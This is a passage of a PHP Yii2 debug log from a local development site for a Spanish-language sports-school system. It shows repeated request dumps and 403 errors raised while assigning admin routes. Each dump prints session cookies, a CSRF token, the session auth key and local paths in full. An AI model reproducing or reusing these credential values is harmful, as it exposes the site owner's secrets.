        90 => '/tienda/producto/*'
        91 => '/tienda/tienda/index'
        92 => '/tienda/tienda/view'
        93 => '/tienda/tienda/create'
        94 => '/tienda/tienda/update'
        95 => '/tienda/tienda/delete'
        96 => '/tienda/tienda/toggle-status'
        97 => '/tienda/tienda/dashboard'
        98 => '/tienda/tienda/*'
        99 => '/tienda/*'
        100 => '/atletas/asistencia/index'
        101 => '/atletas/asistencia/view'
        102 => '/atletas/asistencia/create'
        103 => '/atletas/asistencia/registro-rapido'
        104 => '/atletas/asistencia/registrar-rapido'
        105 => '/atletas/asistencia/marcar-salida'
        106 => '/atletas/asistencia/update'
        107 => '/atletas/asistencia/delete'
        108 => '/atletas/asistencia/reporte'
        109 => '/atletas/asistencia/dashboard'
        110 => '/atletas/asistencia/registro-multiple'
        111 => '/atletas/asistencia/get-atletas-by-escuela'
        112 => '/atletas/asistencia/get-asistencias-hoy'
        113 => '/atletas/asistencia/get-info-escuela'
        114 => '/atletas/asistencia/*'
        115 => '/atletas/atletas-registro/index'
        116 => '/atletas/atletas-registro/view'
        117 => '/atletas/atletas-registro/create'
        118 => '/atletas/atletas-registro/update'
        119 => '/atletas/atletas-registro/delete'
        120 => '/atletas/atletas-registro/calcular-categoria'
        121 => '/atletas/atletas-registro/*'
        122 => '/atletas/default/index'
        123 => '/atletas/default/*'
        124 => '/atletas/*'
        125 => '/escuela_club/*'
        126 => '/ged/default/index'
        127 => '/ged/default/select-escuela'
        128 => '/ged/default/cambiar-escuela'
        129 => '/ged/default/verificar-sesion'
        130 => '/ged/default/reset-sesion'
        131 => '/ged/default/cerrar-escuela'
        132 => '/ged/default/set-school'
        133 => '/ged/default/clear-escuela'
        134 => '/ged/default/debug-mobile'
        135 => '/ged/default/escuela'
        136 => '/ged/default/cambiar-escuela-old'
        137 => '/ged/default/search-schools'
        138 => '/ged/default/buscar-escuelas'
        139 => '/ged/default/*'
        140 => '/ged/*'
        141 => '/aportes/aportes/index'
        142 => '/aportes/aportes/gestion-atleta'
        143 => '/aportes/aportes/view'
        144 => '/aportes/aportes/create'
        145 => '/aportes/aportes/update'
        146 => '/aportes/aportes/delete'
        147 => '/aportes/aportes/marcar-pagado'
        148 => '/aportes/aportes/pago-multiple'
        149 => '/aportes/aportes/pago-adelantado'
        150 => '/aportes/aportes/registro-masivo'
        151 => '/aportes/aportes/compras'
        152 => '/aportes/aportes/reporte-ejecutivo'
        153 => '/aportes/aportes/atletas-morosos'
        154 => '/aportes/aportes/procesar-pago-multiple'
        155 => '/aportes/aportes/procesar-pago-adelantado'
        156 => '/aportes/aportes/obtener-quincenas-pendientes'
        157 => '/aportes/aportes/limpiar-quincenas-anteriores'
        158 => '/aportes/aportes/migrar-datos'
        159 => '/aportes/aportes/*'
        160 => '/aportes/*'
        161 => '/reportes/default/index'
        162 => '/reportes/default/dashboard'
        163 => '/reportes/default/*'
        164 => '/reportes/reportes/atletas'
        165 => '/reportes/reportes/estadisticas-atleta'
        166 => '/reportes/reportes/asistencias'
        167 => '/reportes/reportes/deudas-pendientes'
        168 => '/reportes/reportes/exportar-pdf'
        169 => '/reportes/reportes/exportar-excel'
        170 => '/reportes/reportes/*'
        171 => '/reportes/*'
        172 => '/debug/default/db-explain'
        173 => '/debug/default/index'
        174 => '/debug/default/view'
        175 => '/debug/default/toolbar'
        176 => '/debug/default/download-mail'
        177 => '/debug/default/*'
        178 => '/debug/user/set-identity'
        179 => '/debug/user/reset-identity'
        180 => '/debug/user/*'
        181 => '/debug/*'
        182 => '/gii/default/index'
        183 => '/gii/default/view'
        184 => '/gii/default/preview'
        185 => '/gii/default/diff'
        186 => '/gii/default/action'
        187 => '/gii/default/*'
        188 => '/gii/*'
        189 => '/coordenadas/get-coordenadas-by-vista'
        190 => '/coordenadas/*'
        191 => '/municipio/get-by-edo'
        192 => '/municipio/list'
        193 => '/municipio/*'
        194 => '/parroquia/get-by-muni'
        195 => '/parroquia/get-by-muni-cod'
        196 => '/parroquia/list'
        197 => '/parroquia/*'
        198 => '/perfil/mi-informacion'
        199 => '/perfil/mis-deudas'
        200 => '/perfil/mis-representados'
        201 => '/perfil/*'
        202 => '/site/error'
        203 => '/site/captcha'
        204 => '/site/index'
        205 => '/site/acceder-sistema'
        206 => '/site/login'
        207 => '/site/logout'
        208 => '/site/contact'
        209 => '/site/about'
        210 => '/site/cambiar-password'
        211 => '/site/mi-cuenta'
        212 => '/site/testcss'
        213 => '/site/test-js'
        214 => '/site/check-redirect-loop'
        215 => '/site/get-mobile-menu'
        216 => '/site/debug-menu'
        217 => '/site/test-menu-widget'
        218 => '/site/clear-cache'
        219 => '/site/diagnosticar-menu'
        220 => '/site/reparar-menu'
        221 => '/site/diagnostico-rapido'
        222 => '/site/*'
        223 => '/tasa-dolar/index'
        224 => '/tasa-dolar/actualizar'
        225 => '/tasa-dolar/historial'
        226 => '/tasa-dolar/actualizar-automatico'
        227 => '/tasa-dolar/api-tasa-actual'
        228 => '/tasa-dolar/probar-fuentes'
        229 => '/tasa-dolar/exportar-historial'
        230 => '/tasa-dolar/get-tasa-actual'
        231 => '/tasa-dolar/*'
        232 => '/*'
    ]
]

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'CONTENT_LENGTH' => '9719'
    'HTTP_X_CSRF_TOKEN' => 'LDVun6j-73ZXPXdORwYz1ZJvOrV84XdTjMcZbFrap7peVyT6xpCLOwUOQCcybl6bywdM1iWjEhf0llgbaJLO4A=='
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => '*/*'
    'CONTENT_TYPE' => 'application/x-www-form-urlencoded; charset=UTF-8'
    'HTTP_ORIGIN' => 'http://planealo.local'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58620'
    'REDIRECT_URL' => '/admin/route/assign'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'POST'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/assign'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629381.1371
    'REQUEST_TIME' => 1769629381
]
2026-01-28 15:43:10 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('assign', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ass...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:43:10 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = [
    'routes' => [
        0 => '/site/diagnosticar-menu'
    ]
]

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'CONTENT_LENGTH' => '40'
    'HTTP_X_CSRF_TOKEN' => 'LDVun6j-73ZXPXdORwYz1ZJvOrV84XdTjMcZbFrap7peVyT6xpCLOwUOQCcybl6bywdM1iWjEhf0llgbaJLO4A=='
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => '*/*'
    'CONTENT_TYPE' => 'application/x-www-form-urlencoded; charset=UTF-8'
    'HTTP_ORIGIN' => 'http://planealo.local'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58625'
    'REDIRECT_URL' => '/admin/route/assign'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'POST'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/assign'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629390.3761
    'REQUEST_TIME' => 1769629390
]
2026-01-28 15:43:11 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('assign', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ass...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:43:11 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = [
    'routes' => [
        0 => '/site/diagnosticar-menu'
    ]
]

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'CONTENT_LENGTH' => '40'
    'HTTP_X_CSRF_TOKEN' => 'LDVun6j-73ZXPXdORwYz1ZJvOrV84XdTjMcZbFrap7peVyT6xpCLOwUOQCcybl6bywdM1iWjEhf0llgbaJLO4A=='
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => '*/*'
    'CONTENT_TYPE' => 'application/x-www-form-urlencoded; charset=UTF-8'
    'HTTP_ORIGIN' => 'http://planealo.local'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58625'
    'REDIRECT_URL' => '/admin/route/assign'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'POST'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/admin/route/assign'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629391.1386
    'REQUEST_TIME' => 1769629391
]
2026-01-28 15:43:12 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('assign', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('admin/route/ass...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:43:11 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = [
    'routes' => [
        0 => '/site/diagnosticar-menu'
    ]
]

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'CONTENT_LENGTH' => '40'
    'HTTP_X_CSRF_TOKEN' => 'LDVun6j-73ZXPXdORwYz1ZJvOrV84XdTjMcZbFrap7peVyT6xpCLOwUOQCcybl6bywdM1iWjEhf0llgbaJLO4A=='
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => '*/*'
    'CONTENT_TYPE' => 'application/x-www-form-urlencoded; charset=UTF-8'
    'HTTP_ORIGIN' => 'http://planealo.local'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
